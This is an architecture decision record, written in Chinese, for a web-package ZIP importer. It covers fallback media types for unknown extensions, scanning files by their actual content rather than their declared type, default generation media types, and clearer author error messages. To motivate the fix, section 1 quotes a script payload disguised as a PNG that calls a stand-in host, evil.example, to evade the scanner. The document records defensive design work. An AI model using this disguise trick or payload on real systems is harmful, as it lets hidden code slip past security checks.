# Web 包导入作者可用性决策

状态：`accepted`

日期：2026-09-29

决策标识：`ADR-web-package-import-authorability-v1`

适用范围：本地 Web 包 ZIP 导入的媒体类型派生、manifest 缺省填充、作者向错误反馈与提示投影输入的范围。

本 ADR 修订 [WebPackage ZIP 信封归一化与缺省导入决策](./2026-09-29_114500_WebPackageZIP信封归一化与缺省导入决策.md) §2.2 中「未知扩展名 fail closed」的结论，并与之 [WebPackage 能力预检误报收紧决策](./2026-09-29_150000_WebPackage能力预检误报收紧决策.md) 同批落地。Package identity、Overlay 语义、渲染器权限边界与授权模型不变。

---

## 1. 背景

用真实第三方包 `.tmp/quequan-game-mahoshojo-web-package.zip`（含 `static/favicon.ico`）走导入，得到：

```text
ERR unknown-media-type :: 无法从文件名推断媒体类型：static/favicon.ico
当前支持的扩展名：.css、.gif、.html、.jpeg、.jpg、.js、.json、.md、.mp3、.mp4、.png、.svg、.txt、.webp、.woff2
```

严格性站错了层。真正决定「这段字节会不会被执行」的不是导入器，而是渲染器：

- `render.ts` 对 `<script src>` 指向非 JavaScript 媒体类型直接抛「脚本 MIME 不匹配」；
- 非 CSS 资源只会走 `data:<mediaType>;base64,…`，不会被当样式表解析；
- 未知媒体类型在 `WebPackageManifestSchema` 里本来就允许（`MediaTypeSchema` 只约束 `类型/子类型` 形态）。

与此同时，**声明路径完全没有媒体类型校验**。构造一个 `assets/payload.png` 声明 `image/png`、内容是 `<script>fetch("https://evil.example/x");eval(1)</script>` 的包：导入通过，扫描器因为「不是文本类型」整段跳过，报告零能力。

也就是说：派生路径严到挡住用户，声明路径松到能藏东西，严格性买不到任何安全收益，却让 `.ico`、`.webmanifest`、`.woff`、`.mjs`、`.wasm`、`.avif`、`.vtt` 等常见 Web 资源无法使用。

另外两个作者向问题：

- `generation.target: "static/events.json"` 但漏写 `mediaType` 时，缺省值是 `text/html`，随后撞上 `target must match the existing path and media type`——这条消息完全不提 `mediaType`，作者会去反复检查路径拼写。
- `capabilities: ["storage"]`、`id: "雀权引擎"`、`"mediaType": "text/html; charset=utf-8"` 三类高频 authoring 错误，产出的是 zod 英文原文（`Invalid option: expected one of …`、`must match pattern /^[a-zA-Z0-9]/`、`Invalid string: must match pattern /^[a-z0-9!#$&^_.+-]+\/…/`），对包作者等于让他去读实现。

## 2. 决策

### 2.1 媒体类型表扩容，未知扩展名回落为不透明二进制

`src/media-types.ts` 补齐常见 Web 资源：`.htm`、`.mjs`、`.cjs`、`.webmanifest`、`.csv`、`.xml`、`.avif`、`.bmp`、`.ico`、`.woff`、`.ttf`、`.otf`、`.eot`、`.ogg`、`.oga`、`.wav`、`.m4a`、`.flac`、`.m4v`、`.webm`、`.mov`、`.wasm`、`.vtt`、`.pdf`。

仍然无法推断时**不再拒绝整个包**：派生为 `application/octet-stream`，并在 `diagnostics` 中点名该文件，说明它按不透明二进制处理、以及如何用显式 `files[].mediaType` 覆盖。渲染器会把它当不透明资源，行为正确。

`scripts/generate-web-package-presets.mjs` 保持严格：预设是仓库内受审的创作目录，未知扩展名是 authoring 错误，应当在构建期暴露。同一张映射表，两种失败策略，各自的理由写在代码注释里。

### 2.2 扫描是否按文本进行由内容决定，不由声明的媒体类型决定

`files[].mediaType` 由包作者给出，可以与真实内容不符。预检改为：先按既有体量预算读取，再尝试严格 UTF-8 解码——解码成功就扫描，失败就跳过。因此把脚本声明成 `image/png` 不再能逃过扫描。

媒体类型名单（`isWebPackageBinaryMediaType`）保留，但只用于一件事：体量超过扫描预算的**已知二进制**不做无谓的解码尝试，也不因此把档案标成 `partial`（它本来就扫不出东西，不构成"未扫描"缺口）。

### 2.3 `generation.mediaType` 缺省从目标文件推导

`generation.target` 指向包内已存在的文件时，缺省 `mediaType` 取该文件描述符自己的媒体类型；目标不在包内或不是可生成类型时，仍缺省 `text/html`。诊断写明推导来源。

这样「写了 target 忘了写 mediaType」不再是死路，而 `files` 未声明、目标为 `static/events.json` 的包也能正确导入为 `application/json` 目标。

### 2.4 作者向错误反馈

`invalid-manifest-field` 的失败改为携带中文字段说明与可执行指引，覆盖：`capabilities` 取值、`id`/`version` 字符集、`files[].mediaType` 带参数、`entry` 不存在或非 HTML、`generation.target` 与媒体类型不一致、提示词文件不存在、`files` 重复或保留路径、清单含未知键。未覆盖的情形保留 zod 原文并给出通用指引。

`capabilities` 只接受 `scripts`/`audio`/`video`/`network` 四项，而扫描器有 11 个风险类别——这个枚举与能力模型不对齐的问题仍然存在（作者没有词 express「会读本地存储」）。本轮只把事实说清楚：声明只用于展示，其余能力由预检自动检测并列出。

canonical manifest 是 strict 的，未知**顶层**字段此前被静默丢弃（`entrys` 这类拼写错误不会有人发现）。现在在 `diagnostics` 中点名，仍然不阻断——第三方包常带自己的元数据字段。

### 2.5 提示投影输入不按运行时资源扫描

见 [WebPackage 能力预检误报收紧决策](./2026-09-29_150000_WebPackage能力预检误报收紧决策.md) §2.2。

## 3. 结果

`.tmp/quequan-game-mahoshojo-web-package.zip` 现在可以直接导入：6 个文件的文件表全部派生（`favicon.ico` → `image/vnd.microsoft.icon`），诊断只有「files 未声明」一条，`static/events.json` 的 `application/json` overlay 校验通过，通用渲染器产出 299,169 字节展示 HTML 且无诊断。风险档案与该包的实际行为一致：CDN 依赖、sessionStorage、clipboard、`target="_blank"` 都被报出，7 个外部地址全部为真实目的地。

## 4. 不采用的方案

- **继续对未知扩展名 fail closed**：见 §1，严格性没有换来任何安全收益。
- **用魔数嗅探替代扩展名映射**：`.js` 与 `.txt` 都是合法 UTF-8，嗅探分不出可执行性；而执行性判定已经在渲染器里。
- **未知顶层字段直接报错**：第三方包普遍携带自己的元数据字段，报错会把可用包挡在门外；点名但不阻断是合适的强度。
- **扩大 `capabilities` 枚举以匹配 11 个风险类别**：这是 manifest 契约变更，需要单独评估声明语义与消费方，本轮不夹带。
